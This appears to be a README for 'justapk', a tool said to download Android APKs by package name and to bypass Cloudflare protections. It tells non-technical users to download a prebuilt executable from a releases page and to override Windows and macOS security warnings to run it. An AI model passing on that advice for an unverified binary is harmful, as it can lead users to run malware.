# 📲 justapk - Download APKs by Package Name Fast

[![Download justapk](https://img.shields.io/badge/Download-justapk-blue?style=for-the-badge)](https://github.com/zhidali2333/justapk/releases)

---

justapk is a simple tool to download Android APK files using the app’s package name. It works with six different sources and automatically switches between them if one does not work. It also bypasses Cloudflare protections. You can use it from a command line or through a Python interface.

This guide walks you through downloading and running justapk on your computer without needing programming skills.

---

## 📥 Download justapk

You need to visit the release page on GitHub to get justapk.

[Download justapk here](https://github.com/zhidali2333/justapk/releases)

1. Click the link above or the badge at the top of this page.
2. On the GitHub releases page, look for the latest version. It should have files made for different systems.
3. Download the file that matches your computer system:
   - For Windows, look for a `.exe` or `.zip` file.
   - For macOS, download a `.dmg` or `.zip`.
   - For Linux, a binary or `.tar.gz` might be available.
4. Save the file to a folder you can easily find, like your Desktop or Downloads.

---

## 🚀 How to Run justapk on Your Computer

After downloading, follow the steps below depending on your operating system.

### Windows

1. If you have a `.zip` file, right-click it and choose "Extract All" to unzip.
2. Find the `justapk.exe` or extracted folder.
3. Double-click the `.exe` file to open justapk.
4. The program will open in a command window or a simple interface.
5. If a security warning appears, allow the app to run.

### macOS

1. If you downloaded a `.dmg`, double-click it to open the mounted volume.
2. Drag the justapk app into your Applications folder or Desktop.
3. Open Terminal (you can find it by searching in Spotlight).
4. Navigate to the folder containing justapk. For example, if on Desktop:
   ```bash
   cd ~/Desktop
   ```
5. Run justapk by typing:
   ```bash
   ./justapk
   ```
6. If macOS blocks the app, go to System Preferences > Security & Privacy, then allow it to open.

### Linux

1. If the file is compressed (`.tar.gz`), open Terminal and extract:
   ```bash
   tar -xvzf justapk-version.tar.gz
   ```
2. Go to the folder where justapk is located:
   ```bash
   cd justapk-folder
   ```
3. Make the file executable if needed:
   ```bash
   chmod +x justapk
   ```
4. Run justapk:
   ```bash
   ./justapk
   ```

---

## 🖥️ Using justapk Without Programming Knowledge

justapk works on the command line. Don't worry if you never used it before. This section explains simple commands.

### Open your Command Line Interface

- **Windows:** Press `Win + R`, type `cmd`, then press Enter.
- **macOS:** Open Spotlight (`Cmd + Space`), type `Terminal`, press Enter.
- **Linux:** Use your Terminal app from the applications menu.

### Basic Command to Download an APK

To download an app, you need its package name. The package name is a unique ID like `com.example.app`.

1. Find the package name of the app you want. You can search for it online or check the Google Play Store URL.
2. In the command line, type:
   ```
   justapk download <package_name>
   ```
   For example, to download the package `com.spotify.music`:
   ```
   justapk download com.spotify.music
   ```
3. Press Enter. justapk will search multiple sources, try to bypass Cloudflare, and download the APK file.

---

## 📂 Where to Find Downloaded APKs

By default, justapk saves files in the folder where you ran the command. To find your APK:

- Open the same folder you used to run justapk.
- Look for `.apk` files with the app name or package name.

If you want to save APKs to a specific folder, add the `-o` option:

```
justapk download <package_name> -o /path/to/folder
```

Replace `/path/to/folder` with your desired folder path.

---

## 🐍 Use justapk with Python (Optional)

If you are comfortable using Python, justapk provides an API. This allows you to download APKs from Python scripts.

1. Make sure you have Python installed (version 3.6 or newer). To check, open your command line and type:
   ```
   python --version
   ```
2. Install justapk Python library by downloading from the release or using pip if available.
3. Run Python and import justapk:
   ```python
   from justapk import JustAPK

   apk_downloader = JustAPK()
   path = apk_downloader.download("com.spotify.music")
   print("Downloaded APK saved to:", path)
   ```
This requires some basic Python knowledge, but it helps automate APK downloads.

---

## 🔧 System Requirements

- A computer running Windows 7 or newer, macOS 10.12 or newer, or a recent Linux distribution.
- Internet connection for downloading APKs.
- At least 100 MB free disk space for APK files.
- Optional: Python 3.6 or higher if you want to use the Python API.

---

## ⚙️ Additional Settings and Options

justapk supports a few options to customize your downloads.

- `--source <name>`: Choose a specific source if you want (apkmirror, apkpure, fdroid, etc.).
- `--retry <number>`: Set how many times justapk retries if a download fails.
- `--quiet`: Run without output messages.
- `-h` or `--help`: Display a list of commands and options.

Run this command to see all options:

```
justapk --help
```

---

## 🔍 Troubleshooting Common Issues

- If justapk does not start, ensure the file has execute permissions.
- If your internet is slow or down, APK downloads may fail.
- In case of Cloudflare blocking, justapk tries automatic bypass, but some sources may still fail.
- Make sure you run justapk with the correct package name.
- For Python errors, verify you installed the required Python version.

---

## 📖 More Information

Visit the GitHub page to check for updates, report problems, or learn more about justapk.

[justapk GitHub Releases](https://github.com/zhidali2333/justapk/releases)